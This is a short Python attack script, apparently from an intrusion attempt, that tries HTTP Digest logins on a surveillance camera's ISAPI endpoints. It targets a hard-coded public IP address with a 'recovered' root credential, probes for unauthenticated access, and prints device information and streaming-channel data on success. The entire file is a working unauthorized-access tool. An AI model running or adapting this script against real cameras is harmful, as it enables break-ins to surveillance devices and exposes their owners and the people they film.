#!/usr/bin/env python3
"""Try HTTP Digest login against the camera's ISAPI surface with the recovered credential."""

import hashlib
import base64
import http.client
import os
import re
import sys

HOST = os.environ.get("CAM_HOST", "117.196.244.183")
USER = os.environ.get("CAM_USER", "root")
PASS = os.environ.get("CAM_PASS", "1234567890")

PATHS = [
    "/ISAPI/Security/capabilities",
    "/ISAPI/Streaming/channels",
    "/ISAPI/System/deviceInfo",
    "/ISAPI/ContentMgmt/InputProxy/channels",
    "/doc/ISAPI/Security/capabilities",
]


def md5hex(v):
    return hashlib.md5(v.encode()).hexdigest()


def request(method, path, auth=None):
    conn = http.client.HTTPConnection(HOST, 80, timeout=10)
    headers = {"User-Agent": "isapi-probe/1.0", "Accept": "*/*"}
    if auth:
        headers["Authorization"] = auth
    conn.request(method, path, headers=headers)
    resp = conn.getresponse()
    body = resp.read().decode("utf-8", "replace")
    conn.close()
    return resp.status, resp.getheader("WWW-Authenticate"), body


print(f"[*] Testing {USER}:{PASS} against ISAPI\n")

for path in PATHS:
    try:
        status, challenge, body = request("GET", path)
    except Exception as exc:
        print(f"  {path:<42} ERR {exc}")
        continue

    if status == 200:
        print(f"  {path:<42} 200 UNAUTHENTICATED ACCESS")
        print(f"      {body.strip()[:400]}")
        continue

    if status != 401 or not challenge or "digest" not in challenge.lower():
        print(f"  {path:<42} {status}")
        continue

    parsed = {}
    for part in challenge.split(None, 1)[1].split(","):
        if "=" in part:
            k, _, v = part.strip().partition("=")
            parsed[k.strip().lower()] = v.strip().strip('"')

    realm = parsed.get("realm", "")
    nonce = parsed.get("nonce", "")
    qop = parsed.get("qop")
    uri = path

    if qop:
        cnonce, nc = "0a4f113b", "00000001"
        ha1 = md5hex(f"{USER}:{realm}:{PASS}")
        ha2 = md5hex(f"GET:{uri}")
        resp_d = md5hex(f"{ha1}:{nonce}:{nc}:{cnonce}:auth:{ha2}")
        auth = (f'Digest username="{USER}", realm="{realm}", nonce="{nonce}", '
                f'uri="{uri}", qop=auth, nc={nc}, cnonce="{cnonce}", '
                f'response="{resp_d}"')
    else:
        ha1 = md5hex(f"{USER}:{realm}:{PASS}")
        ha2 = md5hex(f"GET:{uri}")
        resp_d = md5hex(f"{ha1}:{nonce}:{ha2}")
        auth = (f'Digest username="{USER}", realm="{realm}", nonce="{nonce}", '
                f'uri="{uri}", response="{resp_d}"')

    try:
        status2, _, body2 = request("GET", path, auth)
    except Exception as exc:
        print(f"  {path:<42} ERR {exc}")
        continue

    verdict = "LOGIN OK" if status2 == 200 else f"denied ({status2})"
    print(f"  {path:<42} qop={qop or 'none'} -> {verdict}")
    if status2 == 200 and body2.strip():
        print(f"      {body2.strip()[:600]}")
